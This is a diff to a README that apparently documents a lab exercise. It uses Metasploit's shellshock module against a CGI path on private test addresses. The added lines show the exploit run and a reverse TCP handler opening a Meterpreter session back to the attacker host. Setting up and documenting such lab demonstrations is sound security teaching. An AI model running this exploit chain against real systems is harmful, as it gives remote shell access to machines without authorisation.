@@ -71,11 +71,18 @@ Let's assume you expect the host to be vulnerable to shellshock, let's exploit i
 > set TARGETURI /cgi-bin/stats
 ```
 
-Run the exploit and profit
+Run the exploit:
 ```
 > exploit
+
+[*] Started reverse TCP handler on 172.19.0.6:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (976712 bytes) to 172.19.0.3
+[*] Meterpreter session 1 opened (172.19.0.6:4444 -> 172.19.0.3:60846) at 2020-11-04 12:52:22 +0000
+
+meterpreter >
 ```
 
-## Development
+Profit!
 
-- hack into director directory
+
